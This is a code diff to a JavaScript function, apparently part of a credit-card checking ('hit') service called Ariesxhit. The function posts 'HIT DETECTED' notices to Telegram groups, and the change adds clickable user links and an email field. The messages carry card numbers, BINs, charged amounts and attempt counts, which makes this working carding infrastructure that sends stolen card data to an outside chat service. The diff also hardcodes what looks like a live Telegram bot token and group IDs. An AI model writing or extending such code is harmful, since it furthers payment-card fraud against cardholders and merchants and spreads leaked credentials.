@@ -505,6 +505,10 @@ async function sendHitToGroups(hitData, checkoutUrl) {
     attempts: hitData.attempts
   });
 
+  // Create clickable user name link
+  const tgIdNum = String(hitData.userId).replace(/\D/g, '');
+  const userNameLink = tgIdNum ? `<a href="tg://user?id=${tgIdNum}">${hitData.userName}</a>` : hitData.userName;
+
   // DIRECT FIX: Use hardcoded values that we know work
   const BOT_TOKEN = '8268278005:AAG49bxahCC_JjC_vG-pE8lv5RqTU0Duh5M';
   const GROUP_1 = '-1003835715499'; // ARIESxHIT Chat
@@ -513,7 +517,7 @@ async function sendHitToGroups(hitData, checkoutUrl) {
   try {
     // Send to GROUP_1 (ARIESxHIT Chat) - Simple format
     if (GROUP_1) {
-      const group1Message = `🎯 𝗛𝗜𝗧 𝗗𝗘𝗧𝗘𝗖𝗧𝗘𝗗\n─────────────────\n\nName :- ${hitData.userName}\nAmount :- $${hitData.amount}\nAttempt :- ${hitData.attempts}\nTime :- ${hitData.timeTaken}\n\n─────────────────\nThanks For Using Ariesxhit. 💗`;
+      const group1Message = `🎯 𝗛𝗜𝗧 𝗗𝗘𝗧𝗘𝗖𝗧𝗘𝗗\n─────────────────\n\nName :- ${userNameLink}\nAmount :- $${hitData.amount}\nAttempt :- ${hitData.attempts}\nTime :- ${hitData.timeTaken}\n\n─────────────────\nThanks For Using Ariesxhit. 💗`;
 
       await sendMessage(BOT_TOKEN, GROUP_1, group1Message);
       console.log('✅ Group notification sent to ARIESxHIT Chat');
@@ -523,7 +527,7 @@ async function sendHitToGroups(hitData, checkoutUrl) {
     if (GROUP_2) {
       const bin = hitData.bin || 'Unknown';
       const binSource = hitData.binMode || '';
-      const group2Message = `🎯 𝗛𝗜𝗧 𝗗𝗘𝗧𝗘𝗖𝗧𝗘𝗗\n─────────────────\n\n「❃」 Name :- ${hitData.userName}\n「❃」 Card :- ${hitData.card}\n「❃」 Bin :- ${bin}${binSource}\n「❃」 Email :- cardernarutov3@gmail.com\n「❃」 Amount :- $${hitData.amount}\n「❃」 Response : Charged\n「❃」 Attempt :- ${hitData.attempts}\n「❃」 Time :- ${hitData.timeTaken}\n\n─────────────────\nThanks For Using Ariesxhit. 💗`;
+      const group2Message = `🎯 𝗛𝗜𝗧 𝗗𝗘𝗧𝗘𝗖𝗧𝗘𝗗\n─────────────────\n\n「❃」 Name :- ${userNameLink}\n「❃」 Card :- ${hitData.card}\n「❃」 Bin :- ${bin}${binSource}\n「❃」 Email :- ${hitData.email || 'cardernarutov3@gmail.com'}\n「❃」 Amount :- $${hitData.amount}\n「❃」 Response : Charged\n「❃」 Attempt :- ${hitData.attempts}\n「❃」 Time :- ${hitData.timeTaken}\n\n─────────────────\nThanks For Using Ariesxhit. 💗`;
 
       await sendMessage(BOT_TOKEN, GROUP_2, group2Message);
       console.log('✅ Group notification sent to Aries Hits');
